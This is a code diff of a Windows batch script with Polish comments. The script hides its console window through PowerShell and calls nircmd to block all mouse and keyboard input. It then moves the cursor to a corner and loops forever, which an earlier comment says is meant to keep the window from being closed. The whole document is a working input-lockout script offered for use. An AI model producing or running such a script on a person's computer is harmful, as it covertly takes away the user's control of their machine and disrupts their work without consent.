@@ -1,19 +1,18 @@
 @echo off
-:: Ukrycie okna konsoli (działa tylko jeśli uruchomisz przez skrót)
-:: Wymaga utworzenia skrótu do .bat i ustawienia go jako uruchamianie "Minimized"
-
-:: Ścieżka do nircmd
-set nircmdPath=%~dp0nircmd.exe
+:: Ukrycie okna konsoli przy pomocy PowerShell
+powershell -WindowStyle Hidden -Command "Start-Process '%~dp0nircmd.exe' -ArgumentList 'blockinput', '1'"
 
 :: Wyłączenie myszy i klawiatury
-echo Blocking mouse and keyboard...
-%nircmdPath% blockinput 1
+set nircmdPath=%~dp0nircmd.exe
+if not exist "%nircmdPath%" (
+    echo nircmd.exe nie znaleziono! Upewnij się, że jest w tym samym folderze co ten skrypt.
+    exit /b
+)
 
 :: Ukrycie kursora myszy
-%nircmdPath% showsystrayicon 0
 %nircmdPath% setcursor 0 0
 
-:: Zapętlenie nieskończone, żeby okno było cały czas aktywne i nie można było go zamknąć
+:: Zapętlenie nieskończone
 :loop
 timeout /t 9999 > nul
 goto loop
